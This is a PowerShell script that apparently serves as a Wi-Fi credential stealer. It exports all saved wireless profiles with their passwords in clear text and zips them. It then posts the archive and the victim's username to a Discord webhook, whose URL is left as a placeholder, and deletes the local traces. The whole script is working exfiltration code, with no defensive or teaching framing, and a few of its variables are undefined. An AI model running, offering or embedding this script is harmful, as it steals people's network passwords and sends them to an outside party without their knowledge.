Start-Service -Name 'wlansvc';

Add-Type -AssemblyName System.IO.Compression.FileSystem

$folderDateTime = (Get-Date).ToString('d-M-y HHmmss');
$userDir = "$($env:userprofile)\Ghost Report $folderDateTime";
$fileSaveDir = New-Item $userDir -ItemType Directory;
$date = Get-Date;
netsh wlan export profile key=clear folder=$fileSaveDir;
[System.IO.Compression.ZipFile]::CreateFromDirectory($fileSaveDir.FullName, "$env:userprofile\ResultsPassword.zip");

$webhookUrl = 'Link Webhook Discord';

if (Test-Path "$env:userprofile\ResultsPassword.zip") {
    $filePath = "$env:userprofile\ResultsPassword.zip"
    $boundary = [System.Guid]::NewGuid().ToString()
    $crlf = "`r`n"
    $LF = "`n"
    $contentType = "multipart/form-data; boundary=`"$boundary`""
    $headers = @{ "Authorization" = "Bearer $TOKEN" }
    $payload = @"
--$boundary
Content-Disposition: form-data; name="content"

Ghost Report $env:USERNAME

--$boundary
Content-Disposition: form-data; name="file"; filename="ResultsPassword.zip"
Content-Type: application/octet-stream

$(Get-Content $filePath -Raw)

--$boundary--
"@
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -ContentType $contentType -Body $payload
    Write-Output $response
    Remove-Item $filePath
    Remove-Item $userDir -Recurse -Force
} else {
    Write-Host "N/A $zipFilePath."
}

exit;